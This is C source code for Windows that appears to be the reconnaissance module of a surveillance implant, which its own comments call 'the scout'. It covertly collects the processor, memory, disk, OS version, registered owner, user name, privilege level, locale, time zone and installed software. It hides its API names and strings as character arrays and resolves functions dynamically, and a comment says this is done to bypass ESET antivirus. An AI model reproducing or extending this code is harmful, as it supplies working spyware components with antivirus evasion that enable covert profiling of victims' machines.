#include <Windows.h>
#include <Lm.h>
#include <Sddl.h>
#include <stdio.h>
#include <Strsafe.h>
#include "agent_device.h"


PDEVICE_CONTAINER pDeviceContainer = NULL;

#include <Wbemidl.h>
#include <comdef.h> 
#include <Shobjidl.h>
#pragma comment(lib, "wbemuuid.lib")

BOOL ExecQueryGetProp(IWbemServices *pSvc, LPWSTR strQuery, LPWSTR strField,  LPVARIANT lpVar)
{
	BOOL bRet = FALSE;
	IEnumWbemClassObject *pEnum;
	
	BSTR bstrQuery = SysAllocString(strQuery);
	BSTR bstrField = SysAllocString(strField);
	
	WCHAR strWQL[] = { L'W', L'Q', L'L', L'\0' };
	BSTR bWQL = SysAllocString(strWQL);
	//HRESULT hr = pSvc->ExecQuery(bstr_t(strWQL), bstrQuery, 0, NULL, &pEnum);
	HRESULT hr = pSvc->ExecQuery(bWQL, bstrQuery, 0, NULL, &pEnum);
	if (SUCCEEDED(hr))
	{
		ULONG uRet;
		IWbemClassObject *apObj;
		hr = pEnum->Next(5000, 1, &apObj, &uRet);
		if (SUCCEEDED(hr))
		{
			hr = apObj->Get(bstrField, 0, lpVar, NULL, NULL);
			if (hr == WBEM_S_NO_ERROR)
				bRet = TRUE;

			apObj->Release();
		}
	}

	SysFreeString(bstrQuery);
	SysFreeString(bstrField);
	SysFreeString(bWQL);
	
	return bRet;
}



VOID GetDeviceInfo()
{
	HKEY hKey;
	ULONG uLen;
	PDEVICE_INFO pDeviceInfo;
	
	if (pDeviceContainer != NULL)
		return;
	
#ifdef _DEBUG
	OutputDebugString(L"[+] Starting GetDeviceInfo\n");
#endif
	
	pDeviceInfo = (PDEVICE_INFO)malloc(sizeof(DEVICE_INFO));
	SecureZeroMemory(pDeviceInfo, sizeof(DEVICE_INFO));

	ULONG uOut;
	VARIANT pVariant;
	IWbemLocator *pLoc=0;
	IWbemServices *pSvc=0;

	if (CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID *)&pLoc) != S_OK)
		return;
	if (!pLoc)
		return;
	
	WCHAR strRootCIM[] = { L'R', L'O', L'O', L'T', L'\\', L'C', L'I', L'M', L'V', L'2', L'\0' };
	BSTR bRootCIM = SysAllocString(strRootCIM);
	if (FAILED(pLoc->ConnectServer(bRootCIM, NULL, NULL, 0, NULL, 0, 0, &pSvc)))
	{
		pLoc->Release();
		return;
	}
	SysFreeString(bRootCIM);
	
	if (CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE) != S_OK)
	{
		pSvc->Release();
		pLoc->Release();
		return;
	}

	VARIANT vVariant;
	VariantInit(&vVariant);
	if (ExecQueryGetProp(pSvc, L"SELECT * FROM Win32_Processor", L"Name", &vVariant) && vVariant.vt == VT_BSTR)
	{
		wcscpy(pDeviceInfo->procinfo.proc, vVariant.bstrVal);
	}
	VariantClear(&vVariant);

// OK
	SYSTEM_INFO pSysInfo;
	memset(&pSysInfo, 0x0, sizeof(pSysInfo));
	GetSystemInfo(&pSysInfo);
	pDeviceInfo->procinfo.procnum = pSysInfo.dwNumberOfProcessors;
	
	// memory
	MEMORYSTATUSEX pMemoryStatus;
	memset(&pMemoryStatus, 0x0, sizeof(MEMORYSTATUSEX));
	pMemoryStatus.dwLength = sizeof(MEMORYSTATUSEX);
	GlobalMemoryStatusEx(&pMemoryStatus);
	pDeviceInfo->meminfo.memtotal = (ULONG)(pMemoryStatus.ullTotalPhys / (1024*1024));
	pDeviceInfo->meminfo.memfree = (ULONG)(pMemoryStatus.ullAvailPhys / (1024*1024));
	pDeviceInfo->meminfo.memload = (ULONG)(pMemoryStatus.dwMemoryLoad);
		
	VariantInit(&vVariant);
	if (ExecQueryGetProp(pSvc, L"SELECT * FROM Win32_OperatingSystem", L"Caption", &vVariant) && vVariant.vt == VT_BSTR)
		wcscpy(pDeviceInfo->osinfo.ver, vVariant.bstrVal);
	VariantClear(&vVariant);

	VariantInit(&vVariant);
	if (ExecQueryGetProp(pSvc, L"SELECT * FROM Win32_OperatingSystem", L"CSDVersion", &vVariant) && vVariant.vt == VT_BSTR)
		wcscpy(pDeviceInfo->osinfo.sp, vVariant.bstrVal);
	VariantClear(&vVariant);

	VariantInit(&vVariant);
	if (ExecQueryGetProp(pSvc, L"SELECT * FROM Win32_OperatingSystem", L"RegisteredUser", &vVariant) && vVariant.vt == VT_BSTR)
		wcscpy(pDeviceInfo->osinfo.owner, vVariant.bstrVal);
	VariantClear(&vVariant);
	
	
	// user
	uLen = sizeof(pDeviceInfo->userinfo.username) / sizeof(WCHAR);
	GetUserName(pDeviceInfo->userinfo.username, &uLen);
	
	PBYTE pUserInfo = NULL;
	pDeviceInfo->userinfo.priv = 0;
	SecureZeroMemory(pDeviceInfo->userinfo.fullname, 0x2);
	SecureZeroMemory(pDeviceInfo->userinfo.sid, 0x2);
	
	
	typedef NET_API_STATUS (WINAPI *NetUserGetInfo_p)(
		_In_   LPCWSTR servername,
		_In_   LPCWSTR username,
		_In_   DWORD level,
		_Out_  LPBYTE *bufptr);

	CHAR strNetUserGetInfo[] = { 'N', 'e', 't', 'U', 's', 'e', 'r', 'G', 'e', 't', 'I', 'n', 'f', 'o', 0x0 };
	NetUserGetInfo_p fpNetUserGetInfo = (NetUserGetInfo_p) GetProcAddress(LoadLibrary(L"Netapi32"), strNetUserGetInfo);
	if (fpNetUserGetInfo)
		if (fpNetUserGetInfo(NULL, pDeviceInfo->userinfo.username, 1, &pUserInfo) == NERR_Success)
			pDeviceInfo->userinfo.priv = ((PUSER_INFO_1)pUserInfo)->usri1_priv;		
	
	
	
	
	CHAR strGetLocaleInfoW[] = { 'G', 'e', 't', 'L', 'o', 'c', 'a', 'l', 'e', 'I', 'n', 'f', 'o', 'W', 0x0 };
	typedef ULONG (WINAPI *GETLOCALEINFO)(LCID, LCTYPE, LPWSTR, ULONG);
	GETLOCALEINFO fpGetLocaleInfo = (GETLOCALEINFO) GetProcAddress(LoadLibrary(L"kernel32"), strGetLocaleInfoW);
	// locale & timezone
	
	if (!fpGetLocaleInfo(LOCALE_USER_DEFAULT, LOCALE_SISO639LANGNAME, pDeviceInfo->localinfo.lang, sizeof(pDeviceInfo->localinfo.lang) / sizeof(WCHAR)))
		pDeviceInfo->localinfo.lang[0] = L'\0';
	if (!fpGetLocaleInfo(LOCALE_USER_DEFAULT, LOCALE_SISO3166CTRYNAME, pDeviceInfo->localinfo.country, sizeof(pDeviceInfo->localinfo.country) / sizeof(WCHAR)))
		pDeviceInfo->localinfo.country[0] = L'\0';
	
	LPWSTR strTimeZone = (LPWSTR) malloc(0x1000*sizeof(WCHAR));
	VariantInit(&vVariant);
	if (ExecQueryGetProp(pSvc, L"SELECT * FROM Win32_TimeZone", L"Description", &vVariant) && vVariant.vt == VT_BSTR)
		wcscpy(strTimeZone, vVariant.bstrVal);
	VariantClear(&vVariant);
	
	
	// disk	
	ULARGE_INTEGER uDiskFree, uDiskTotal;
	PWCHAR wPath = (PWCHAR)malloc(32767 * sizeof(WCHAR));
	
	
	if (!GetTempPath(32766, wPath))
		wPath[0] = L'\0';
	
	//if (!GetEnvironmentVariable(L"TMP", wPath, 32767 * sizeof(WCHAR)))
	//	wcsncpy_s(wPath, 32767 * sizeof(WCHAR), L"C:\\", _TRUNCATE);
	
	// GetProcAddress vari per bypass ESET 
	
	CHAR strGetDiskFreeSpaceExW[] = { 'G', 'e', 't', 'D', 'i', 's', 'k', 'F', 'r', 'e', 'e', 'S', 'p', 'a', 'c', 'e', 'E', 'x', 'W', 0x0 };
	typedef BOOL (WINAPI *GETDISKFREESPACEEX) (LPWSTR, PULARGE_INTEGER, PULARGE_INTEGER, PULARGE_INTEGER);	
	GETDISKFREESPACEEX pfn_GetDiskFreeSpaceEx = (GETDISKFREESPACEEX) GetProcAddress(LoadLibrary(L"kernel32"), strGetDiskFreeSpaceExW);
	
	if (pfn_GetDiskFreeSpaceEx(wPath, &uDiskFree, &uDiskTotal, NULL))
	{
		pDeviceInfo->diskinfo.disktotal = (ULONG) (uDiskTotal.QuadPart / (1024*1024));
		pDeviceInfo->diskinfo.diskfree = (ULONG) (uDiskFree.QuadPart / (1024*1024));
	}
	else
		pDeviceInfo->diskinfo.disktotal = pDeviceInfo->diskinfo.diskfree = 0;
	free(wPath);

	PWCHAR pApplicationList = GetApplicationList(FALSE);
	PWCHAR pApplicationList64 = NULL;
	
	BOOL bIsWow64, bIsx64OS;
	IsX64System(&bIsWow64, &bIsx64OS);	
	if (bIsWow64)
		pApplicationList64 = GetApplicationList(TRUE);
		
	PWCHAR pDeviceString = (PWCHAR)malloc(sizeof(DEVICE_INFO)
		+ (pApplicationList ? wcslen(pApplicationList) * sizeof(WCHAR) : 0 )
		+ (pApplicationList64 ? wcslen(pApplicationList64) * sizeof(WCHAR) : 0)
		+ 1024); // fixme dwSize
	SecureZeroMemory(pDeviceString, 1024);

	DWORD dwSize =  sizeof(DEVICE_INFO) + (pApplicationList ? wcslen(pApplicationList) * sizeof(WCHAR) : 0 ) + (pApplicationList64 ? wcslen(pApplicationList64) * sizeof(WCHAR) : 0) + 1024;
	
	WCHAR str64[] = { L'6', L'4', L'b', L'i', L't', L'\0' };
	WCHAR str32[] = { L'3', L'2', L'b', L'i', L't', L'\0' };
	WCHAR strGuest[] = { L' ', L'[', L'G', L'U', L'E', L'S', L'T', L']', L'\0'};
	WCHAR strAdmin[] = { L' ', L'[', L'A', L'D', L'M', L'I', L'N', L']', L'\0'};
	WCHAR strFormat[] = { L'C', L'P', L'U', L':', L' ', L'%', L'd', L' ', L'x', L' ', L'%', L's', L'\n', L'A', L'r', L'c', L'h', L'i', L't', L'e', L'c', L't', L'u', L'r', L'e', L':', L' ', L'%', L's', L'\n', L'R', L'A', L'M', L':', L' ', L'%', L'd', L'M', L'B', L' ', L'f', L'r', L'e', L'e', L' ', L'/', L' ', L'%', L'd', L'M', L'B', L' ', L't', L'o', L't', L'a', L'l', L' ', L'(', L'%', L'u', L'%', L'%', L' ', L'u', L's', L'e', L'd', L')', L'\n', L'H', L'a', L'r', L'd', L'D', L'i', L's', L'k', L':', L' ', L'%', L'd', L'M', L'B', L' ', L'f', L'r', L'e', L'e', L' ', L'/', L' ', L'%', L'd', L'M', L'B', L' ', L't', L'o', L't', L'a', L'l', L'\n', L'\n', L'W', L'i', L'n', L'd', L'o', L'w', L's', L' ', L'V', L'e', L'r', L's', L'i', L'o', L'n', L':', L' ', L'%', L's', L'%', L's', L'%', L's', L'%', L's', L'%', L's', L'\n', L'R', L'e', L'g', L'i', L's', L't', L'e', L'r', L'e', L'd', L' ', L't', L'o', L':', L' ', L'%', L's', L'%', L's', L'%', L's', L'%', L's', L' ', L'{', L'%', L's', L'}', L'\n', L'L', L'o', L'c', L'a', L'l', L'e', L':', L' ', L'%', L's', L'_', L'%', L's', L' ', L'(', L'%', L's', L')', L'\n', L'\n', L'U', L's', L'e', L'r', L' ', L'I', L'n', L'f', L'o', L':', L' ', L'%', L's', L'%', L's', L'%', L's', L'%', L's', L'%', L's', L'\n', L'S', L'I', L'D', L':', L' ', L'%', L's', L'\n', L'\n', L'A', L'p', L'p', L'l', L'i', L'c', L'a', L't', L'i', L'o', L'n', L' ', L'L', L'i', L's', L't', L' ', L'(', L'x', L'8', L'6', L')', L':', L'\n', L'%', L's', L'\n', L'A', L'p', L'p', L'l', L'i', L'c', L'a', L't', L'i', L'o', L'n', L'L', L'i', L's', L't', L' ', L'(', L'x', L'6', L'4', L')', L':', L'\n', L'%', L's', L'\0' };
	

	StringCbPrintf(pDeviceString, dwSize,	
		//L"CPU: %d x %s\n"
		//L"Architecture: %s\n"
		//L"RAM: %dMB free / %dMB total (%u%% used)\n"
		//L"Hard Disk: %dMB free / %dMB total\n"
		//L"\n"
		//L"Windows Version: %s%s%s%s%s\n"
		//L"Registered to: %s%s%s%s {%s}\n"
		//L"Locale: %s_%s (%s)\n"
		//L"\n"
		//L"User Info: %s%s%s%s%s\n"
		//L"SID: %s\n"
		//L"\nApplication List (x86):\n%s\nApplicationList (x64):\n%s",
		//
		strFormat,
		pDeviceInfo->procinfo.procnum, pDeviceInfo->procinfo.proc,
		bIsx64OS ? str64 : str32,
		pDeviceInfo->meminfo.memfree, pDeviceInfo->meminfo.memtotal, pDeviceInfo->meminfo.memload,
		pDeviceInfo->diskinfo.diskfree, pDeviceInfo->diskinfo.disktotal,
		pDeviceInfo->osinfo.ver, (pDeviceInfo->osinfo.sp[0]) ? L" (" : L"", (pDeviceInfo->osinfo.sp[0]) ? pDeviceInfo->osinfo.sp : L"", (pDeviceInfo->osinfo.sp[0]) ? L")" : L"", bIsx64OS ? str64 : str32,
		pDeviceInfo->osinfo.owner, (pDeviceInfo->osinfo.org[0]) ? L" (" : L"", (pDeviceInfo->osinfo.org[0]) ? pDeviceInfo->osinfo.org : L"", (pDeviceInfo->osinfo.org[0]) ? L")" : L"", pDeviceInfo->osinfo.id,
		pDeviceInfo->localinfo.lang, pDeviceInfo->localinfo.country, strTimeZone,
		pDeviceInfo->userinfo.username, (pDeviceInfo->userinfo.fullname[0]) ? L" (" : L"", (pDeviceInfo->userinfo.fullname[0]) ? pDeviceInfo->userinfo.fullname : L"", (pDeviceInfo->userinfo.fullname[0]) ? L")" : L"", (pDeviceInfo->userinfo.priv) ? ((pDeviceInfo->userinfo.priv == 1) ? L"" : strAdmin) : strGuest,
		pDeviceInfo->userinfo.sid,
		pApplicationList ? pApplicationList: L"",
		pApplicationList64 ? pApplicationList64 : L"");
	

	pDeviceContainer = (PDEVICE_CONTAINER)malloc(sizeof(DEVICE_CONTAINER));
	pDeviceContainer->pDataBuffer = (PBYTE)pDeviceString;
	pDeviceContainer->uSize = (wcslen(pDeviceString)+1)*sizeof(WCHAR);
	
	pSvc->Release();
	pLoc->Release();
	
	free(strTimeZone);
	free(pApplicationList);
	free(pApplicationList64);
	free(pDeviceInfo);
	
	return;
}

PWCHAR GetApplicationList(BOOL bX64View)
{
	ULONG uLen, uIndex, uVal, uAppList;
	HKEY hKeyUninstall, hKeyProgram;
	WCHAR pStringValue[128], pProduct[256];
	PWCHAR pApplicationList = NULL;
	
	uLen = uIndex = 0;
	hKeyUninstall = hKeyProgram = NULL;
	
	ULONG uSamDesidered = KEY_READ;
	if (bX64View)
		uSamDesidered |= KEY_WOW64_64KEY;
	
	WCHAR strAdvapi32[] = { L'A', L'd', L'v', L'a', L'p', L'i', L'3', L'2', L'\0' };
	CHAR strRegOpenKeyExW[] = { 'R', 'e', 'g', 'O', 'p', 'e', 'n', 'K', 'e', 'y', 'E', 'x', 'W', 0x0 };

	typedef LONG (WINAPI *RegOpenKeyEx_p)(_In_ HKEY hKey, _In_opt_ LPWSTR lpSubKey, DWORD ulOptions, _In_ REGSAM samDesired, _Out_ PHKEY phkResult);
	RegOpenKeyEx_p fpRegOpenKeyExW = (RegOpenKeyEx_p) GetProcAddress(LoadLibrary(strAdvapi32), strRegOpenKeyExW);

	WCHAR strKey[] = { L'S', L'O', L'F', L'T', L'W', L'A', L'R', L'E', L'\\', L'M', L'i', L'c', L'r', L'o', L's', L'o', L'f', L't', L'\\', L'W', L'i', L'n', L'd', L'o', L'w', L's', L'\\', L'C', L'u', L'r', L'r', L'e', L'n', L't', L'V', L'e', L'r', L's', L'i', L'o', L'n', L'\\', L'U', L'n', L'i', L'n', L's', L't', L'a', L'l', L'l', L'\0' };
		
	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, strKey, 0, uSamDesidered, &hKeyUninstall) == ERROR_SUCCESS)
	{
		while (1)
		{
			if (hKeyProgram)
			{
				RegCloseKey(hKeyProgram);
				hKeyProgram = NULL;
			}

			uLen = sizeof(pStringValue) / sizeof(WCHAR);
			if (RegEnumKeyEx(hKeyUninstall, uIndex++, pStringValue, &uLen, NULL, NULL, NULL, NULL) != ERROR_SUCCESS)
				break;

 			if (RegOpenKeyEx(hKeyUninstall, pStringValue, 0, uSamDesidered, &hKeyProgram) != ERROR_SUCCESS)
				continue;

			WCHAR strParentKeyName[] = { L'P', L'a', L'r', L'e', L'n', L't', L'K', L'e', L'y', L'N', L'a', L'm', L'e', L'\0' };
			if (!RegQueryValueEx(hKeyProgram, strParentKeyName, NULL, NULL, NULL, NULL))
				continue;

			// no windows security essential without this.
			WCHAR strSystemComponent[] = { L'S', L'y', L's', L't', L'e', L'm', L'C', L'o', L'm', L'p', L'o', L'n', L'e', L'n', L't', L'e', L'\0' };
			uLen = sizeof(ULONG);
			if (!RegQueryValueEx(hKeyProgram, strSystemComponent, NULL, NULL, (PBYTE)&uVal, &uLen) && (uVal == 1))
				continue;

			WCHAR strDisplayName[] = { L'D', L'i', L's', L'p', L'l', L'a', L'y', L'N', L'a', L'm', L'e', L'\0' };
			uLen = sizeof(pStringValue);
			if (RegQueryValueEx(hKeyProgram, strDisplayName, NULL, NULL, (PBYTE)pStringValue, &uLen) != ERROR_SUCCESS)
				continue;

			wcsncpy_s(pProduct, sizeof(pProduct) / sizeof(WCHAR), pStringValue, _TRUNCATE);


			WCHAR strDisplayVersion[] = { L'D', L'i', L's', L'p', L'l', L'a', L'y', L'V', L'e', L'r', L's', L'i', L'o', 'n', L'\0' };
			uLen = sizeof(pStringValue);
			if (!RegQueryValueEx(hKeyProgram, strDisplayVersion, NULL, NULL, (PBYTE)pStringValue, &uLen))
			{
				wcsncat_s(pProduct, sizeof(pProduct) / sizeof(WCHAR), L"   (", _TRUNCATE);
				wcsncat_s(pProduct, sizeof(pProduct) / sizeof(WCHAR), pStringValue, _TRUNCATE);
				wcsncat_s(pProduct, sizeof(pProduct) / sizeof(WCHAR), L")", _TRUNCATE);
			}
			wcsncat_s(pProduct, sizeof(pProduct) / sizeof(WCHAR), L"\n", _TRUNCATE);

			if (!pApplicationList)
			{
 				uAppList = wcslen(pProduct) * sizeof(WCHAR) + sizeof(WCHAR);
				pApplicationList = (PWCHAR)realloc(NULL,  uAppList);
				memset(pApplicationList, 0x0, uAppList);
			}
			else
			{
				uAppList = wcslen(pApplicationList)*sizeof(WCHAR) + wcslen(pProduct)*sizeof(WCHAR) + sizeof(WCHAR);
				pApplicationList = (PWCHAR)realloc(pApplicationList, uAppList);
			}
			wcsncat_s(pApplicationList, uAppList / sizeof(WCHAR), pProduct, wcslen(pProduct));
		}
	}
		
	return pApplicationList;
}

VOID IsX64System(PBOOL bIsWow64, PBOOL bIsx64OS) 
{   
    //SYSTEM_INFO SysInfo;
	
	CHAR strIsWow64Process[] = { 'I', 's', 'W', 'o', 'w', '6', '4', 'P', 'r', 'o', 'c', 'e', 's', 's', 0x0 };
	//CHAR strGetNativeSystemInfo[] = { 'G', 'e', 't', 'N', 'a', 't', 'i', 'v', 'e', 'S', 'y', 's', 't', 'e', 'm', 'I', 'n', 'f', 'o', 0x0 };
	WCHAR strKernel32[] = { L'k', L'e', L'r', L'n', L'e', L'l', L'3', L'2', L'\0' };
		
	typedef VOID (WINAPI *IsWow64Process_p)(HANDLE, PBOOL);	
	IsWow64Process_p fpIsWow64Process = (IsWow64Process_p) GetProcAddress(LoadLibrary(strKernel32), strIsWow64Process);
	fpIsWow64Process((HANDLE)-1, bIsWow64);
	
	*bIsx64OS = *bIsWow64; // lo scout e' a 32, quindi se e' wow64 siamo su x64
	
	/*
	IsWow64Process(GetCurrentProcess(), &bIsx64OS);
	typedef VOID (WINAPI *GetNativeSystemInfo_p)(LPSYSTEM_INFO);
	GetNativeSystemInfo_p fpGetNativeSystemInfo = (GetNativeSystemInfo_p) GetProcAddress(LoadLibrary(strKernel32), strGetNativeSystemInfo);
	fpGetNativeSystemInfo(&SysInfo);
	
	if(SysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL)
		*bIsx64OS = FALSE;
	else
		*bIsx64OS = TRUE;
	*/
	return;
}